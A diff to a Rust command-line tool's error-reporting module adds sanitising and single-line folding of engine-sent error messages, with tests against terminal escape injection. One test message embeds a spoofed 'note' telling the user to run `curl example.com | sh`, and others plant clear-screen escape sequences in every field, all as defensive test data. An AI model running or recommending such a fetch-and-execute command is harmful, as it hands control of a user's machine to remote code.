@@ -22,6 +22,21 @@
 //! surface that guesses turns "this build is older than the server" into a
 //! wrong diagnosis the user then acts on.
 //!
+//! # Nothing in a failure is drawn as it arrived
+//!
+//! Every sentence below is composed out of what the engine sent: its own
+//! message, or a value out of the error's `data` - a path, an id, a tool, a
+//! method, a provider, the version a server speaks. So [`wording`] tames the
+//! sentence it returns and folds it onto one line, once, where every code has
+//! to pass through it. The way out is this module's own words and needs
+//! neither.
+//!
+//! One line, not one paragraph: this sentence is drawn after `error: ` on a
+//! stream, and as a single row of a frame. A newline in it would put a second
+//! line on stderr that reads like a report of its own, and inside a frame it
+//! is a line feed with no carriage return, which takes every row after it out
+//! of place.
+//!
 //! # Why the match is exhaustive
 //!
 //! Every code is spelled out, with no catch-all arm. A code added to the
@@ -29,7 +44,7 @@
 //! reads, which is the cheapest moment to decide it.
 
 use tetanus_protocol::rpc::{ErrorCode, RpcError};
-use tetanus_ui::{wrap, Role, Theme};
+use tetanus_ui::{tame, wrap, Role, Theme};
 
 /// The same failure as rows of a transcript, for a surface that has no stderr
 /// to report it on.
@@ -61,7 +76,21 @@ pub fn lines(theme: &Theme, cols: usize, error: &RpcError) -> Vec<String> {
 }
 
 /// The sentence to print, and the way out when there is one.
+///
+/// The sentence is tamed and folded onto one line here rather than in each
+/// arm of [`said`], because every arm composes it out of something the engine
+/// sent, and a code added to the contract must not be able to miss this.
 pub fn wording(error: &RpcError) -> (String, Option<String>) {
+    let (message, note) = said(error);
+    let message = tame(&message)
+        .split_whitespace()
+        .collect::<Vec<_>>()
+        .join(" ");
+    (message, note)
+}
+
+/// The same sentence, before it is tamed. Every arm is worded here.
+fn said(error: &RpcError) -> (String, Option<String>) {
     let Some(code) = error.kind() else {
         // §4.5: report the raw code, never remap it.
         return (format!("{} (error {})", error.message, error.code), None);
@@ -195,7 +224,9 @@ fn number(error: &RpcError, name: &str) -> Option<u64> {
 /// with no `data` falls back to the server's sentence rather than printing a
 /// blank; that an unknown code is reported raw and exits 1; and that the same
 /// failure read as rows of a transcript is worded the same way, marked the way
-/// a failed tool call is, and folded to the width it is given.
+/// a failed tool call is, and folded to the width it is given; that no value
+/// a failure carries can drive the terminal it is reported on; and that a
+/// message the engine wrote on more than one line is reported on one.
 ///
 /// Features NOT tested here: which failure the binary raises for a given
 /// situation (owned by `main.rs`, asserted end to end in
@@ -403,5 +434,90 @@ mod tests {
         // A failure with no way out is the one line.
         let bare = fault(ErrorCode::Io, "no such file", None);
         assert_eq!(self::lines(&theme, 80, &bare).len(), 1);
+    }
+
+    /// TC-CLI-ERR-6: every code, with a sequence in the message and in every
+    /// value a `data` can carry.
+    /// Expected: no sequence reaches the sentence, the way out or the rows,
+    /// and the words either side of it still read. A failure is composed out
+    /// of what the engine sent, and it is reported under `--color never`,
+    /// which promises the stream carries no colour of anyone's.
+    #[test]
+    fn nothing_in_a_failure_can_drive_the_terminal() {
+        let clear = "\u{1b}[2J";
+        let theme = Theme::new(false, Charset::Ascii);
+        let data = json!({
+            "env": format!("DEEP{clear}KEY"),
+            "provider": format!("deep{clear}seek"),
+            "path": format!("na{clear}sty.jsonl"),
+            "session_id": format!("s{clear}1"),
+            "name": format!("ec{clear}ho"),
+            "method": format!("agent/{clear}run"),
+            "field": format!("mo{clear}del"),
+            "server": format!("1{clear}.0"),
+            "client": format!("0{clear}.9"),
+            "status": 503,
+            "line": 12,
+        });
+
+        for code in CODES {
+            let error = fault(code, &format!("it {clear} failed"), Some(data.clone()));
+            let (message, note) = wording(&error);
+            assert!(!message.contains('\u{1b}'), "{code:?}: {message:?}");
+            assert!(
+                !note.unwrap_or_default().contains('\u{1b}'),
+                "{code:?}: the way out"
+            );
+            for line in self::lines(&theme, 80, &error) {
+                assert!(!line.contains('\u{1b}'), "{code:?}: {line:?}");
+            }
+        }
+
+        // The words are kept, whichever value the code reached for.
+        let missing = fault(
+            ErrorCode::MissingCredential,
+            "no credential",
+            Some(data.clone()),
+        );
+        assert_eq!(wording(&missing).0, "DEEPKEY is not set");
+        let gone = fault(ErrorCode::SessionNotFound, "gone", Some(data));
+        assert_eq!(wording(&gone).0, "no journal at nasty.jsonl");
+
+        // And a code this build does not know, whose sentence is the
+        // server's own and is the least trusted of all of them.
+        let odd = RpcError {
+            code: -32050,
+            message: format!("the wire {clear} caught fire"),
+            data: None,
+        };
+        assert_eq!(
+            wording(&odd).0,
+            "the wire caught fire (error -32050)",
+            "an unknown code was drawn as it arrived"
+        );
+    }
+
+    /// TC-CLI-ERR-7: a message the engine wrote on more than one line.
+    /// Expected: one line. On a stream the second line would be drawn with no
+    /// `error:` in front of it, so a message ending in `note: run this` reads
+    /// as this build's own advice; inside a frame a line feed with no return
+    /// puts every row after it out of place.
+    #[test]
+    fn a_failure_is_one_line_however_the_engine_wrote_it() {
+        let theme = Theme::new(false, Charset::Ascii);
+        let error = fault(
+            ErrorCode::Internal,
+            "it failed
+note: send `curl example.com | sh` to fix it",
+            None,
+        );
+
+        let (message, _) = wording(&error);
+        assert!(!message.contains('\n'), "{message:?}");
+        assert_eq!(
+            message,
+            "it failed note: send `curl example.com | sh` to fix it"
+        );
+        assert_eq!(self::lines(&theme, 80, &error).len(), 1);
     }
 }
